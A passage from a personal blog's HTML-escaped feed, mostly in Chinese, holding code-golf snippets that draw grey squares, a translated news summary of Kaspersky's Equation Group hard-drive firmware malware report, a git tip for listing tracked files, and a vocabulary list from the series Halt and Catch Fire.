&lt;li&gt;R - 35 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;symbols&lt;span class="p"&gt;(&lt;/span&gt;x&lt;span class="p"&gt;,,,&lt;/span&gt;x&lt;span class="o"&gt;&amp;lt;-&lt;/span&gt;&lt;span class="m"&gt;50&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="m"&gt;99&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;bg&lt;span class="o"&gt;=&lt;/span&gt;gray&lt;span class="p"&gt;(&lt;/span&gt;x&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;99&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ipython 2 - 54 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;t=arange(50);c=t/50.;scatter(t%5,t,500,zip(c,c,c),&amp;#39;s&amp;#39;)  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ipython 2 - 61 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;imshow(arange(50).reshape(5,10)*.02,&amp;#39;Greys&amp;#39;,None,1,&amp;#39;nearest&amp;#39;)  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;BBC BASIC - 57 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;FORn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="il"&gt;51&lt;/span&gt;&lt;span class="vg"&gt;TO2STEP&lt;/span&gt;&lt;span class="il"&gt;-1&lt;/span&gt;&lt;span class="vg"&gt;VDU19&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="il"&gt;-1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="vg"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="vg"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nl"&gt;n:&lt;/span&gt;&lt;span class="vg"&gt;RECTANGLEFILL0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="il"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="vg"&gt;n&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="il"&gt;20&lt;/span&gt;&lt;span class="vg"&gt;NEXT&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;C++ - 93 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;cstdio&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;\e[48;2;%i;%i;%im &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;C - 58 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;\e[48;2;%i;%i;%im &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;JavaScript - 72 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;font color=#&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; size=7&amp;gt;&amp;amp;#9632;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;JavaScript - 70 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;font color=&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; size=7&amp;gt;&amp;amp;#9632;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一大堆... 剩下懶得看了XDD&lt;br /&gt;
好多沒看過的語言啊...&lt;br /&gt;
是說原來這種比誰寫的 code 短的比賽方式叫 Code Golf 呀  &lt;/p&gt;</summary><category term="Fifty Shades of Grey"></category><category term="joke"></category><category term="geek"></category><category term="Code Golf"></category></entry><entry><title>Malware Deep Within Hard Drive Firmware</title><link href="https://blog.m157q.tw/posts/2015/02/18/malware-deep-within-hard-drive-firmware/" rel="alternate"></link><published>2015-02-18T21:21:29+08:00</published><updated>2015-02-18T21:21:29+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-18:posts/2015/02/18/malware-deep-within-hard-drive-firmware/</id><summary type="html">&lt;h1&gt;Intro&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The team of malicious actors is dubbed the the "Equation Group" by researchers from Moscow-based Kaspersky Lab, and describes them as "probably one of the most sophisticated cyber attack groups in the world," and "the most advanced threat actor we have seen."  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這個被稱作是 Equation Group 的駭客組織，&lt;br /&gt;
被卡巴斯基位於莫斯科的研究人員認為&lt;br /&gt;
可能是目前使用最複雜的網路攻擊手法且最具威脅性的駭客組織之一。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Russian security experts reportedly uncovered state-created spyware hidden in the hard drive firmware of more than dozen of the largest manufacturers brands in the industry, including Samsung, Western Digital, Seagate, Maxtor, Toshiba and Hitachi.&lt;br /&gt;
These infected hard drives would have given the cyber criminals persistence on victims' computers and allowed them to set up secret data stores on the machines, which is only accessible to the malicious hackers.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;許多硬碟大廠生產的硬碟都中標了，&lt;br /&gt;
包括 Samsung, WD, Seagate, Maxtor, Toshiba, Hitachi。&lt;br /&gt;
這些受到感染的硬碟將會允許駭客植入隱藏的且只有駭客能存取的資料。&lt;br /&gt;
(這不是幾乎所有硬碟都別用了嗎...?)  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the most sophisticated features of these notorious piece of hacking tools is the ability to infect not just the files stored on a hard drive, but also the firmware controlling the hard drive itself. The malware is hidden deep within hard drives in such a way that it is difficult to detect or remove it.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不僅可以感染硬碟上的檔案，更嚴重的是可以感染控制硬碟的韌體，導致非常難偵測和移除。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If present, once the victim insert that infected storage (such as a CD or USB drive) into an internet-connected PC, the malicious code allows hackers to snoop victims' data and map their networks that would otherwise be inaccessible.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;被感染的 CD 或 USB 插入連網的電腦的話，&lt;br /&gt;
將會導致駭客可以窺探受害者的資料並對應出使用者在網路上的位置。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Such an exploit could survive a complete hard drive wipe, or the re-installation of an operating system, and "exceeds anything we have ever seen before,"  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;格式化硬碟或重灌作業系統都無法清除此惡意程式，&lt;br /&gt;
超越了至今為止我們所見過的惡意程式。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The firm recovered two modules belonging to Equation group, dubbed EquationDrug and GrayFish. Both were used to reprogram hard drives to give the malicious hackers ability to persistently control over a target machine.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此惡意程式包含了 EquationDrug 和 GrayFish 兩個模組，&lt;br /&gt;
兩者皆是用來對硬碟進行重新程式化，&lt;br /&gt;
駭客藉此得以對受害者的電腦進行持續性的控制。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GrayFish can install itself into computer's boot record — a software code that loads before the operating system itself — and stores all of its data inside a portion of the operating system known as the registry, where configuration data is normally stored.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;GrayFish 可以將自身安裝進電腦的 Boot Record 中，&lt;br /&gt;
並將自身的資料儲存在作業系統的 Registry 中。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EquationDrug, on the other hand, was designed to be used on older versions of Windows operating systems, and "some of the plugins were designed originally for use on Windows 95/98/ME" — very old versions of Windows OS that they offer a good indication of the Equation Group's age.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;EquationDrug 則是被設計來用於早期的 Windows 作業系統中，&lt;br /&gt;
裡頭一些套件甚至是被設計用於 Windows 95/98/Me 上，&lt;br /&gt;
這也顯示了 Equation Group 這個組織存在了一段不短的時間了。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Security researchers are calling the malware as the "ancestor" of Stuxnet and Flame, the most sophisticated and powerful threats that were specially designed to spy and sabotage ICS and SCADA systems.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;資安研究者將此惡意程式視為 Stuxnet 和 Flame 這兩個惡意程式的原型。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kaspersky declined to publicly name the country or agency behind the spying campaign, but said it was closely linked to Stuxnet — the NSA-led cyberweapon that was used to sabotage the Iran's uranium enrichment facility.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;卡巴斯基並未言明 Equation Group 幕後的支持者是誰，&lt;br /&gt;
但表示和 Stuxnet (NSA 用來攻擊伊朗核電廠的工具) 有密切關聯。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Another reason is that most of the infections discovered by the Moscow-based security firm have occurred in countries that are frequently US spying targets, such as China, Iran, Pakistan and Russia.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另外一個懷疑的原因則是，&lt;br /&gt;
受害事件發生的國家幾乎都是美國監視的國家，&lt;br /&gt;
如：中國、伊朗、巴基斯坦、俄羅斯。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For its part, the NSA declined to comment on the report.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NSA 目前拒絕對此做出任何回應。  &lt;/p&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thehackernews.com/2015/02/hard-drive-firmware-hacking.html"&gt;NSA Planted Stuxnet-Type Malware Deep Within Hard Drive Firmware - Hacker News&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/94142"&gt;Kaspersky發現歷來最高明的駭客團體 疑與NSA有關聯 | iThome&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.geek.com/apps/nsa-malware-found-hiding-in-hard-drives-for-almost-20-years-1615949/"&gt;NSA malware found hiding in hard drives for almost 20 years | Apps and Software | Geek.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="NSA"></category><category term="malware"></category><category term="Security"></category></entry><entry><title>Check files tracked by git</title><link href="https://blog.m157q.tw/posts/2015/02/18/check-files-tracked-by-git/" rel="alternate"></link><published>2015-02-18T11:39:37+08:00</published><updated>2015-02-18T11:39:37+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-18:posts/2015/02/18/check-files-tracked-by-git/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git ls-files  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git ls-tree -r &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;branch&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; --name-only  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/15606955/how-can-i-make-git-show-a-list-of-the-files-that-are-being-tracked"&gt;How can I make git show a list of the files that are being tracked? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="Git"></category></entry><entry><title>Vocabulary of Halt and Catch Fire S01E01 to S01E05</title><link href="https://blog.m157q.tw/posts/2015/02/17/vocabulary-of-halt-and-catch-fire-s01e01-to-s01e05/" rel="alternate"></link><published>2015-10-27T12:47:00+08:00</published><updated>2015-10-27T12:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-17:posts/2015/02/17/vocabulary-of-halt-and-catch-fire-s01e01-to-s01e05/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;看到 Pellaeon 在 FB 上說 WIRED 推薦觀看，&lt;br /&gt;
稍微看了一下簡介也覺得蠻適合資工阿宅的，&lt;br /&gt;
於是就到 Popcorn-Time 上看了，&lt;br /&gt;
一看就停不下來，看了五集，&lt;br /&gt;
覺得比 Silicon Valley 還要好看。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;看的時候就一直截一些我覺得很 geek 的畫面XD  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;身為一個專業阿宅，當然要喝 Dr Pepper  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Dr pepper" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/drpepper.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;孩子的教育不能等，修玩具的時候就要教她什麼是 ROM, bits, VFD, Chip  &lt;ul&gt;
&lt;li&gt;&lt;img alt="ROM" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/toy_rom.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="bits" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/toy_bits.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="VFD" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/toy_vfd.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Chip" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/toy_chip.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開放架構的未來(?)  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Open Arch" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/openarch.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reverse engineering an IBM PC with me.  &lt;ul&gt;
&lt;li&gt;&lt;img alt="IBM PC" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/ibmpc.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 1" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re1.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 2" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re2.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 3" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re3.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 4" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re4.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 5" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re5.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 6" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re6.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 7" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re7.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 8" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re8.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 9" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re9.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 10" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re10.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 11" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re11.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Reverse Engineering 12" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/re12.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;“Computers aren't the thing. They're the thing that gets us to the thing.”  &lt;/li&gt;
&lt;li&gt;Assembly Code  &lt;ul&gt;
&lt;li&gt;&lt;img alt="ASM 1" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/asm1.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="ASM 2" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/asm2.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="ASM 3" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/asm3.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Programmer 的工作場所總是如此凌亂XD  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Coder Room" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/coderroom.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;“They’re just machines for turning pizza into code.” 現在則是把咖啡變代碼?  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Pizza" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/pizza.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;“Code monkeys, come here.”  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Code Monkeys" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/codemonkeys.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;一講到 IC, 台灣也出現啦  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Taiwan" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/taiwan.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;軟工聖經：人月神話(The Mythical Man-Month) 也出現了  &lt;ul&gt;
&lt;li&gt;&lt;img alt="TMMM" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/tmmm.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ada Lovelace - The First Programmer  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Ada Lovelace" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/adalovelace.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Grace Hopper - The Mother of COBOL, Compiler 先驅  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Grace Hopper" src="/files/vocabularies-in-halt-and-catch-fire-s01e01-to-s01e05/gracehopper.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Vocabularies&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mortgage  
KK[ˋmɔrgɪdʒ] DJ[ˋmɔ:gidʒ]  
n.名詞  
  1. 抵押[U][C]  
  2. 抵押借款[C]  
  3. 抵押契據[C]  
  4. 受押人對抵押品的權利[U][C]  

vt.及物動詞  
  1. 抵押[（+to/for）]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Lutheran  
KK[ˋluθərən] DJ[ˋlu:θərən]  
a.形容詞  
  1. 馬丁路德的；路德教派的  
n.名詞  
  1. 馬丁路德的信徒  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;meringue  
KK[məˋræŋ] DJ[məˋræŋ]  
n.名詞  
  1. 【法】調合蛋白（蛋白拌糖打硬後置於餅或蛋糕上）  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mesmerize  
KK[ˋmɛsmə͵raɪz] DJ[ˋmesməraiz]  
vt.及物動詞  
  1. 對……施催眠術  
  2. 迷住；迷惑  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ragtag  
KK[ˋræg͵tæg] DJ[ˋrægtæg]  
n.名詞  
  1. 下層社會  
  2. 賤民；烏合之眾  
a.形容詞  
  1. 群氓的，賤民的  
  2. 衣衫襤褸的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sprinkler  
KK[ˋsprɪŋklɚ] DJ[ˋspriŋklə]  
n.名詞  
  1. 灑水車；灑水器  
  2. 地下灌溉系統  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;hissing  

  1. 嘶嘶聲發出嘶嘶聲  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pastry  
KK[ˋpestrɪ] DJ[ˋpeistri]  
n.名詞  
  1. 油酥（或其他配料的）麵糰[U]  
  2. 酥皮點心（如餡餅，水果派）[C][U]  
    She is a good hand at pastry.  
    她善做糕點。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pigsty  
KK[ˋpɪg͵staɪ] DJ[ˋpigstai]  
n.名詞  
  1. 豬舍  
  2. 髒亂的地方  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apricot  
KK[ˋeprɪ͵kɑt] DJ[ˋeiprikɔt]  
n.名詞  
  1. 杏仁[C]  
  2. 【植】杏，杏樹[C]  
  3. 杏黃色[U]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pediatrician  
KK[͵pidɪəˋtrɪʃən] DJ[͵pi:diəˋtriʃən]  
n.名詞  
  1. 小兒科醫師  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;retrieval  
KK[rɪˋtriv!] DJ[riˋtri:vəl]  
n.名詞  
  1. 取回；恢復  
  2. 糾正；補償  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tenacious  
KK[tɪˋneʃəs] DJ[tiˋneiʃəs]  
a.形容詞  
  1. 緊握的  
  2. 堅持的，頑強的，固執的  
  3. （記憶力）強的  
  4. 堅韌的  
  5. 黏的，黏著力強的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;degauss  
KK[diˋgaʊs] DJ[di:ˋgaus]  
vt.及物動詞  
  1. 中和四周之磁場以防禦磁雷  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;probation  
KK[proˋbeʃən] DJ[prəuˋbeiʃən]  
n.[U]不可數名詞  
  1. 檢驗；鑑定  
  2. 試用；見習；試讀  
  3. 試用期；見習期；試讀期  
  4. 【律】緩刑  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;insignia  
KK[ɪnˋsɪgnɪə] DJ[inˋsigniə]  
n.名詞  
  1. （常複數）表示階級、團體成員身分等用的佩章、衣飾等  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gouge  
KK[gaʊdʒ] DJ[gaudʒ]  
n.名詞  
  1. 半圓鑿  
